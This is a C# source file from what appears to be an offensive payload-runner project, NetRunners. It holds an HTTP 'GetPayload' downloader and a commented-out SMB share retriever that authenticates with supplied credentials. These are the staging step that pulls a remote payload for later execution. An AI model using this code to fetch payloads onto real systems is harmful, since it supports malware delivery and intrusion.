using System;
using System.Net;
using System.IO;
using static NetRunners.Data.Structures;
using static NetRunners.Data.Delegates;

/// Credits:https://github.com/cpu0x00

namespace NetRunners.Retrievers
{
    /// <summary>
    /// this is a simple class that contains a http downloader function
    /// </summary>
    public class Http
    {

        /// <summary>
        /// Downloads from a given url, The Return Type is a byte[] to be Flexible with any sort of data being downloaded. 
        /// </summary>
        /// <param name="url"></param>
        /// <returns>byte array containing the data</returns>
        public static byte[] GetPayload(string url)
        {
            using (WebClient cl = new WebClient())
            {
                byte[] data = new byte[] { };
                try
                {
                    data = cl.DownloadData(url);
                }
                catch (Exception ex) { Console.WriteLine($"[-] WebClient download failed with error: {ex.Message}"); }

                return data;
            }
        }
    }
    //public class Smb
    //{
    //    /// <summary>
    //    /// This Function Retrieves a File over SMB UNC path by authenticating to the Share and Reading the File without Mapping the Share to a Device
    //    /// </summary>
    //    /// <param name="username"></param>
    //    /// <param name="password"></param>
    //    /// <param name="filename"></param>
    //    /// <param name="sharename"></param>
    //    /// <returns>byte array containg the data</returns>
    //    public static byte[] GetPayload(string username, string password, string filename, string sharename)
    //    {

    //        const int RESOURCETYPE_DISK = 0x00000001;
    //        byte[] data = new byte[] { };

    //        NETRESOURCE nr = new NETRESOURCE /* initializing NETRESOURCE struct with the needed values*/
    //        {
    //            dwType = RESOURCETYPE_DISK,
    //            lpRemoteName = sharename
    //        };

    //        int result = WNetUseConnectionA(IntPtr.Zero, nr, password, username, 0, null, null, null);

    //        if (result == 0)
    //        { /* Connection Success, Read the file*/
    //            data = File.ReadAllBytes(filename);
    //        }
    //        else { Console.WriteLine($"[-] SMB connection Failed with error code: {result}, use (net helpmsg ERROR_CODE_HERE) to find out why"); }

    //        return data;

    //    }
    //}
}
